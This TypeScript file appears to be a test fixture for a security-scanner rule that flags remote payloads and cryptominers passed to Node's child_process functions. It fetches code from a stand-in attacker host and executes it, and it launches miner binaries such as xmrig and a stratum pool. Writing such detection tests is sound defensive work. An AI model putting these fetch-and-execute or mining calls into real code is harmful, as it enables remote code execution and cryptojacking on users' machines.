// FROM : 
// fetch() / `./xmrig` / `./ethminer` / `./cgminer` / `./t-rex --algo ethash` / `./connect.js` / `./minerd` / `stratum+tcp://pool.example.com:3333`
// 
// TO : 
// directCp.exec / directCp.spawn / directCp.spawnSync / directCp.execFileSync / directCp.fork / directCpNode.execSync / directCp.execFile / directCpNode.spawn

import * as directCp from 'child_process';
import * as directCpNode from 'node:child_process';
import fetch from 'node-fetch';

async function triggerRule() {
    const r = await fetch('http://attacker.com/payload');
    const s1 = await r.text();
    directCp.exec(s1 as any);
    directCp.spawn(s1 as any, []);
    directCp.spawnSync(s1 as any, []);
    directCp.execFileSync(s1 as any, []);
    directCp.fork(s1 as any);
    directCpNode.execSync(s1 as any);
    directCp.execFile(s1 as any, [], { shell: true });
    directCpNode.spawn(s1 as any, [], { shell: true });

    const s2 = './xmrig';
    directCp.exec(s2 as any);
    directCp.spawn(s2 as any, []);
    directCp.spawnSync(s2 as any, []);
    directCp.execFileSync(s2 as any, []);
    directCp.fork(s2 as any);
    directCpNode.execSync(s2 as any);
    directCp.execFile(s2 as any, [], { shell: true });
    directCpNode.spawn(s2 as any, [], { shell: true });

    const s3 = './ethminer';
    directCp.exec(s3 as any);
    directCp.spawn(s3 as any, []);
    directCp.spawnSync(s3 as any, []);
    directCp.execFileSync(s3 as any, []);
    directCp.fork(s3 as any);
    directCpNode.execSync(s3 as any);
    directCp.execFile(s3 as any, [], { shell: true });
    directCpNode.spawn(s3 as any, [], { shell: true });

    const s4 = './cgminer';
    directCp.exec(s4 as any);
    directCp.spawn(s4 as any, []);
    directCp.spawnSync(s4 as any, []);
    directCp.execFileSync(s4 as any, []);
    directCp.fork(s4 as any);
    directCpNode.execSync(s4 as any);
    directCp.execFile(s4 as any, [], { shell: true });
    directCpNode.spawn(s4 as any, [], { shell: true });

    const s5 = 'stratum+tcp://pool.example.com:3333';
    directCp.exec(s5 as any);
    directCp.spawn(s5 as any, []);
    directCp.spawnSync(s5 as any, []);
    directCp.execFileSync(s5 as any, []);
    directCp.fork(s5 as any);
    directCpNode.execSync(s5 as any);
    directCp.execFile(s5 as any, [], { shell: true });
    directCpNode.spawn(s5 as any, [], { shell: true });

    const s6 = './t-rex --algo ethash';
    directCp.exec(s6 as any);
    directCp.spawn(s6 as any, []);
    directCp.spawnSync(s6 as any, []);
    directCp.execFileSync(s6 as any, []);
    directCp.fork(s6 as any);
    directCpNode.execSync(s6 as any);
    directCp.execFile(s6 as any, [], { shell: true });
    directCpNode.spawn(s6 as any, [], { shell: true });

    const s7 = './connect.js';
    directCp.exec(s7 as any);
    directCp.spawn(s7 as any, []);
    directCp.spawnSync(s7 as any, []);
    directCp.execFileSync(s7 as any, []);
    directCp.fork(s7 as any);
    directCpNode.execSync(s7 as any);
    directCp.execFile(s7 as any, [], { shell: true });
    directCpNode.spawn(s7 as any, [], { shell: true });

    const s8 = './minerd';
    directCp.exec(s8 as any);
    directCp.spawn(s8 as any, []);
    directCp.spawnSync(s8 as any, []);
    directCp.execFileSync(s8 as any, []);
    directCp.fork(s8 as any);
    directCpNode.execSync(s8 as any);
    directCp.execFile(s8 as any, [], { shell: true });
    directCpNode.spawn(s8 as any, [], { shell: true });
}

export { };